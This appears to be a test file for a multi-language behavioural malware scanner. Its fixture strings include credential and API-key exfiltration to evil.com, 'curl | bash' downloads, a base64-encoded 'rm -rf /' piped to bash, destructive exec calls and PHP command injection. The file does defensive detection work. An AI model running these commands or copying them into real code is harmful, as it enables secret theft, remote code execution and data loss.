import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { shExtractor } from '../core/analysers/behavioural/sh-extractor.js';
import { rbExtractor } from '../core/analysers/behavioural/rb-extractor.js';
import { phpExtractor } from '../core/analysers/behavioural/php-extractor.js';
import { goExtractor } from '../core/analysers/behavioural/go-extractor.js';
import { analyseDataflows } from '../core/analysers/behavioural/dataflow.js';
import { BehaviouralAnalyser } from '../core/analysers/behavioural/index.js';
import { defaultPolicy } from '../core/scan-policy.js';
import type { FileInfo } from '../scanner/file-walker.js';

function makeFile(relativePath: string, content: string): FileInfo {
  const ext = '.' + relativePath.split('.').pop()!;
  return {
    path: `/scan-root/${relativePath}`,
    relativePath,
    content,
    extension: ext,
  };
}

// ═══════════════════════════════════════════════════════════════════════
// Shell Extractor
// ═══════════════════════════════════════════════════════════════════════

describe('Shell Extractor', () => {
  it('should extract source scripts as imports', () => {
    const r = shExtractor.extract('source ~/.bashrc', 'test.sh');
    assert.ok(r);
    assert.equal(r.imports.length, 1);
    assert.equal(r.imports[0].source, '~/.bashrc');
  });

  it('should extract shell functions', () => {
    const r = shExtractor.extract('deploy() {\n  echo "deploying"\n}', 'test.sh');
    assert.ok(r);
    assert.equal(r.functions.length, 1);
    assert.equal(r.functions[0].name, 'deploy');
  });

  it('should detect env variable sources', () => {
    const r = shExtractor.extract('TOKEN=$API_KEY', 'test.sh');
    assert.ok(r);
    assert.ok(r.sources.some(s => s.kind === 'env'));
  });

  it('should detect credential file reads', () => {
    const r = shExtractor.extract('KEY=$(cat ~/.ssh/id_rsa)', 'test.sh');
    assert.ok(r);
    assert.ok(r.sources.some(s => s.kind === 'credential_file'));
  });

  it('should detect curl sinks', () => {
    const r = shExtractor.extract('curl -X POST -d "$DATA" https://evil.com', 'test.sh');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'network_send'));
  });

  it('should detect eval sinks', () => {
    const r = shExtractor.extract('eval "$COMMAND"', 'test.sh');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'eval'));
  });

  it('should detect pipe to shell', () => {
    const r = shExtractor.extract('curl https://evil.com/payload | bash', 'test.sh');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'eval'));
  });

  it('should detect base64 decode pipe', () => {
    const r = shExtractor.extract('echo "cm0gLXJmIC8=" | base64 -d | bash', 'test.sh');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'eval'));
  });
});

describe('Shell Dataflow', () => {
  it('should detect env → curl exfiltration', () => {
    const code = 'TOKEN=$API_KEY\ncurl -X POST -d "$TOKEN" https://evil.com';
    const extraction = shExtractor.extract(code, 'exfil.sh')!;
    const flows = analyseDataflows(extraction, code, 'shell');
    assert.ok(flows.length > 0, 'Should detect env → curl flow');
  });

  it('should detect credential read → network send', () => {
    const code = 'KEY=$(cat ~/.ssh/id_rsa)\ncurl -X POST -d "$KEY" https://evil.com';
    const extraction = shExtractor.extract(code, 'steal.sh')!;
    const flows = analyseDataflows(extraction, code, 'shell');
    assert.ok(flows.length > 0, 'Should detect credential → network flow');
  });
});

// ═══════════════════════════════════════════════════════════════════════
// Ruby Extractor
// ═══════════════════════════════════════════════════════════════════════

describe('Ruby Extractor', () => {
  it('should extract require statements', () => {
    const r = rbExtractor.extract("require 'net/http'", 'test.rb');
    assert.ok(r);
    assert.equal(r.imports.length, 1);
    assert.equal(r.imports[0].source, 'net/http');
  });

  it('should extract method definitions', () => {
    const r = rbExtractor.extract('def process_data(input, output)\n  # ...\nend', 'test.rb');
    assert.ok(r);
    assert.equal(r.functions[0].name, 'process_data');
    assert.deepEqual(r.functions[0].params, ['input', 'output']);
  });

  it('should detect ENV access', () => {
    const r = rbExtractor.extract('secret = ENV["API_KEY"]', 'test.rb');
    assert.ok(r);
    assert.ok(r.sources.some(s => s.kind === 'env'));
  });

  it('should detect system() sink', () => {
    const r = rbExtractor.extract('system("rm -rf /")', 'test.rb');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'exec'));
  });

  it('should detect backtick execution', () => {
    const r = rbExtractor.extract('output = `ls -la`', 'test.rb');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'exec'));
  });

  it('should detect eval sink', () => {
    const r = rbExtractor.extract('eval(user_input)', 'test.rb');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'eval'));
  });

  it('should detect Net::HTTP.post', () => {
    const r = rbExtractor.extract('Net::HTTP.post(uri, data)', 'test.rb');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'network_send'));
  });
});

describe('Ruby Dataflow', () => {
  it('should detect ENV → HTTP exfiltration', () => {
    const code = [
      "require 'net/http'",
      '',
      'secret = ENV["API_KEY"]',
      'Net::HTTP.post(uri, secret)',
    ].join('\n');
    const extraction = rbExtractor.extract(code, 'exfil.rb')!;
    const flows = analyseDataflows(extraction, code, 'ruby');
    assert.ok(flows.length > 0, 'Should detect ENV → network flow');
  });
});

// ═══════════════════════════════════════════════════════════════════════
// PHP Extractor
// ═══════════════════════════════════════════════════════════════════════

describe('PHP Extractor', () => {
  it('should extract use statements', () => {
    const r = phpExtractor.extract('use App\\Services\\AuthService;', 'test.php');
    assert.ok(r);
    assert.equal(r.imports.length, 1);
  });

  it('should extract require statements', () => {
    const r = phpExtractor.extract("require_once 'vendor/autoload.php';", 'test.php');
    assert.ok(r);
    assert.equal(r.imports[0].source, 'vendor/autoload.php');
  });

  it('should extract function definitions', () => {
    const r = phpExtractor.extract('function processInput($data, $options) {', 'test.php');
    assert.ok(r);
    assert.equal(r.functions[0].name, 'processInput');
  });

  it('should detect $_GET source', () => {
    const r = phpExtractor.extract('$input = $_GET["cmd"];', 'test.php');
    assert.ok(r);
    assert.ok(r.sources.some(s => s.kind === 'user_input'));
  });

  it('should detect $_ENV source', () => {
    const r = phpExtractor.extract('$key = $_ENV["API_KEY"];', 'test.php');
    assert.ok(r);
    assert.ok(r.sources.some(s => s.kind === 'env'));
  });

  it('should detect exec() sink', () => {
    const r = phpExtractor.extract('exec($command, $output);', 'test.php');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'exec'));
  });

  it('should detect eval() sink', () => {
    const r = phpExtractor.extract('eval($code);', 'test.php');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'eval'));
  });

  it('should detect shell_exec() sink', () => {
    const r = phpExtractor.extract('shell_exec("whoami");', 'test.php');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'exec'));
  });

  it('should detect file_put_contents() sink', () => {
    const r = phpExtractor.extract('file_put_contents("/tmp/out", $data);', 'test.php');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'file_write'));
  });

  it('should detect include with variable (code injection)', () => {
    const r = phpExtractor.extract('include($user_file);', 'test.php');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'eval'));
  });
});

describe('PHP Dataflow', () => {
  it('should detect $_GET → exec command injection', () => {
    const code = '$cmd = $_GET["cmd"];\nexec($cmd);';
    const extraction = phpExtractor.extract(code, 'inject.php')!;
    const flows = analyseDataflows(extraction, code, 'php');
    assert.ok(flows.length > 0, 'Should detect $_GET → exec flow');
  });

  it('should detect $_ENV → curl exfiltration', () => {
    const code = '$key = $_ENV["SECRET"];\ncurl_exec($key);';
    const extraction = phpExtractor.extract(code, 'exfil.php')!;
    const flows = analyseDataflows(extraction, code, 'php');
    assert.ok(flows.length > 0, 'Should detect $_ENV → curl flow');
  });
});

// ═══════════════════════════════════════════════════════════════════════
// Go Extractor
// ═══════════════════════════════════════════════════════════════════════

describe('Go Extractor', () => {
  it('should extract single import', () => {
    const r = goExtractor.extract('import "os"', 'test.go');
    assert.ok(r);
    assert.equal(r.imports.length, 1);
    assert.equal(r.imports[0].source, 'os');
  });

  it('should extract import block', () => {
    const code = 'import (\n\t"os"\n\t"os/exec"\n\t"net/http"\n)';
    const r = goExtractor.extract(code, 'test.go');
    assert.ok(r);
    assert.equal(r.imports.length, 3);
  });

  it('should extract function definitions', () => {
    const r = goExtractor.extract('func ProcessData(input string, count int) error {', 'test.go');
    assert.ok(r);
    assert.equal(r.functions[0].name, 'ProcessData');
    assert.equal(r.functions[0].exported, true);
  });

  it('should mark lowercase functions as unexported', () => {
    const r = goExtractor.extract('func processData(input string) {', 'test.go');
    assert.ok(r);
    assert.equal(r.functions[0].exported, false);
  });

  it('should detect os.Getenv source', () => {
    const r = goExtractor.extract('key := os.Getenv("API_KEY")', 'test.go');
    assert.ok(r);
    assert.ok(r.sources.some(s => s.kind === 'env'));
  });

  it('should detect os.ReadFile source', () => {
    const r = goExtractor.extract('data, err := os.ReadFile("/etc/passwd")', 'test.go');
    assert.ok(r);
    assert.ok(r.sources.some(s => s.kind === 'fs_read'));
  });

  it('should detect exec.Command sink', () => {
    const r = goExtractor.extract('cmd := exec.Command("rm", "-rf", "/")', 'test.go');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'exec'));
  });

  it('should detect http.Post sink', () => {
    const r = goExtractor.extract('resp, err := http.Post("https://evil.com", "text/plain", body)', 'test.go');
    assert.ok(r);
    assert.ok(r.sinks.some(s => s.kind === 'network_send'));
  });

  it('should detect credential file reads', () => {
    const r = goExtractor.extract('data, _ := os.ReadFile("/home/user/.ssh/id_rsa")', 'test.go');
    assert.ok(r);
    assert.ok(r.sources.some(s => s.kind === 'credential_file'));
  });
});

describe('Go Dataflow', () => {
  it('should detect env → http.Post exfiltration', () => {
    const code = [
      'package main',
      'import "os"',
      'import "net/http"',
      '',
      'secret := os.Getenv("API_KEY")',
      'http.Post("https://evil.com", "text/plain", secret)',
    ].join('\n');
    const extraction = goExtractor.extract(code, 'exfil.go')!;
    const flows = analyseDataflows(extraction, code, 'go');
    assert.ok(flows.length > 0, 'Should detect env → http.Post flow');
  });

  it('should detect file read → exec (Go short declaration)', () => {
    const code = [
      'data, _ := os.ReadFile("config")',
      'exec.Command("bash", "-c", data)',
    ].join('\n');
    const extraction = goExtractor.extract(code, 'rce.go')!;
    const flows = analyseDataflows(extraction, code, 'go');
    assert.ok(flows.length > 0, 'Should detect file → exec flow');
  });
});

// ═══════════════════════════════════════════════════════════════════════
// BehaviouralAnalyser integration — all languages
// ═══════════════════════════════════════════════════════════════════════

describe('BehaviouralAnalyser (multi-language)', () => {
  it('should analyse shell scripts', async () => {
    const code = 'TOKEN=$API_KEY\ncurl -X POST -d "$TOKEN" https://evil.com/exfil';
    const analyser = new BehaviouralAnalyser();
    const findings = await analyser.analyse({
      rootDir: '.',
      files: [makeFile('evil.sh', code)],
      policy: defaultPolicy(),
    });
    assert.ok(findings.length > 0, 'Should produce findings for malicious shell');
  });

  it('should analyse Ruby files', async () => {
    const code = 'secret = ENV["API_KEY"]\nsystem("curl -d #{secret} https://evil.com")';
    const analyser = new BehaviouralAnalyser();
    const findings = await analyser.analyse({
      rootDir: '.',
      files: [makeFile('evil.rb', code)],
      policy: defaultPolicy(),
    });
    assert.ok(findings.length > 0, 'Should produce findings for malicious Ruby');
  });

  it('should analyse PHP files', async () => {
    const code = '$cmd = $_GET["cmd"];\nexec($cmd);';
    const analyser = new BehaviouralAnalyser();
    const findings = await analyser.analyse({
      rootDir: '.',
      files: [makeFile('evil.php', code)],
      policy: defaultPolicy(),
    });
    assert.ok(findings.length > 0, 'Should produce findings for malicious PHP');
  });

  it('should analyse Go files', async () => {
    const code = 'secret := os.Getenv("KEY")\nhttp.Post("https://evil.com", "text/plain", secret)';
    const analyser = new BehaviouralAnalyser();
    const findings = await analyser.analyse({
      rootDir: '.',
      files: [makeFile('evil.go', code)],
      policy: defaultPolicy(),
    });
    assert.ok(findings.length > 0, 'Should produce findings for malicious Go');
  });

  it('should analyse mixed-language project', async () => {
    const analyser = new BehaviouralAnalyser();
    const findings = await analyser.analyse({
      rootDir: '.',
      files: [
        makeFile('deploy.sh', 'TOKEN=$SECRET\ncurl -d "$TOKEN" https://evil.com'),
        makeFile('app.py', 'import os\nimport requests\nkey = os.environ["KEY"]\nrequests.post("https://evil.com", data=key)'),
        makeFile('main.go', 'secret := os.Getenv("KEY")\nhttp.Post("https://evil.com", "text/plain", secret)'),
        makeFile('index.php', '$key = $_ENV["KEY"];\ncurl_exec($key);'),
      ],
      policy: defaultPolicy(),
    });
    assert.ok(findings.length >= 4, `Should produce findings from all languages, got ${findings.length}`);
  });

  it('should skip unsupported file types', async () => {
    const analyser = new BehaviouralAnalyser();
    const findings = await analyser.analyse({
      rootDir: '.',
      files: [makeFile('data.csv', 'name,age\nAlice,30')],
      policy: defaultPolicy(),
    });
    assert.equal(findings.length, 0, 'Should produce no findings for unsupported types');
  });
});
